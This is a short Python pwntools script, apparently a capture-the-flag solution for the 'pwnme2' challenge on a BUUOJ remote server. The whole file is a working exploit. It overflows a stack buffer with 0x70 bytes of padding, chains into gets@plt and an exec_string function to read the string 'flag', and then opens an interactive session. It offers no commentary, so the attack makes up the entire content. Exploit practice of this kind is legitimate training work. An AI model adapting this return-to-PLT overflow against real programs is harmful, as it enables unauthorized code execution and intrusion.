from pwn import *
context.log_level = 'debug'
# io = process('pwnme2')
elf = ELF('pwnme2')
io = remote('node4.buuoj.cn',27397)


exec_string = 0x80485CB
add_home = 0x8048644
add_flag = 0x8048682
string_addr = 0x0804A060
gets_plt = elf.plt['gets']


payload = b'a'*(0x6c+0x4) + p32(gets_plt) + p32(exec_string) + p32(string_addr)
io.recvuntil(b'input')
io.sendline(payload)
io.sendline(b'flag')
io.interactive()